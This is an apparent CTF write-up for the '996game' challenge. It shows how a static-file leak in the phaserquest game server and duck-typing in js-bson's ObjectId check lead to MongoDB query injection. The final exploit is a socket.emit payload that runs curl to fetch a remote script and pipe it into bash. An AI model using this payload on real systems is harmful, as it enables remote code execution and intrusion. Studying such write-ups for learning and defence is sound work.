### 996game

#### OrZ

This challenge is temporarily made in the afternoon before the CTF game(From findding bugs to challenges). So there are some rushes in this challenge , please bear with me.

#### writeup

First we can find hint from HTML source code.

![](https://i.imgur.com/yCKELtI.png)

It's an open-source HTML5 game. 

https://github.com/Jerenaux/phaserquest

We can see there is a static file leak vulnerability

https://github.com/Jerenaux/phaserquest/blob/master/server.js#L44

```javascript
app.use('/css',express.static(__dirname + '/css'));
app.use('/js',express.static(__dirname + '/js'));
app.use('/assets',express.static(__dirname + '/assets'));
```
![](https://i.imgur.com/2isT1nn.png)

Now, we need to find a way to get mongodb error.

Only one thing we can control is id, so we can track the `ObjectId()` function.

https://github.com/mongodb/js-bson/blob/V1.0.4/lib/bson/objectid.js#L28

```javascript
...

var valid = ObjectID.isValid(id);

...

ObjectID.isValid = function isValid(id) {
  if(id == null) return false;

  if(typeof id == 'number') {
    return true;
  }

  if(typeof id == 'string') {
    return id.length == 12 || (id.length == 24 && checkForHexRegExp.test(id));
  }

  if(id instanceof ObjectID) {
    return true;
  }

  if(id instanceof _Buffer) {
    return true;
  }

  // Duck-Typing detection of ObjectId like objects
  if(id.toHexString) {
    return id.id.length == 12 || (id.id.length == 24 && checkForHexRegExp.test(id.id));
  }

  return false;
};

```
Now we can use `id = {"id":{"length":12}}` bypass it.

```javascript
...

  if(!valid && id != null){
    throw new Error("Argument passed in must be a single String of 12 bytes or a string of 24 hex characters");
  } else if(valid && typeof id == 'string' && id.length == 24 && hasBufferType) {
    return new ObjectID(new Buffer(id, 'hex'));
  } else if(valid && typeof id == 'string' && id.length == 24) {
    return ObjectID.createFromHexString(id);
  } else if(id != null && id.length === 12) {
    // assume 12 byte string
    this.id = id;
  } else if(id != null && id.toHexString) {
    // Duck-typing to support ObjectId from different npm packages
    return id;
  } else {
    throw new Error("Argument passed in must be a single String of 12 bytes or a string of 24 hex characters");
  }
...
```
Now , we change our payload to 
`id = {"length":0,"toHexString":true,"id":{"length":12}},`

And then the whole payload will be sent to mongodb server.

```javascript
MongoDB shell version: 2.6.10
connecting to: test
> db.a.find({"b":{"$gt":1,"c":"d"}})
error: {
	"$err" : "Can't canonicalize query: BadValue unknown operator: c",
	"code" : 17287
}

```

So the whole exploit is

```javascript
Client.socket.emit('init-world',{new:false,id:{"$in":[1],"require('child_process').exec('/usr/bin/curl host/shell2|bash')":"bbb","length":0,"toHexString":true,"id":{"length":12}},clientTime:"sacsaccsacsac"});
```
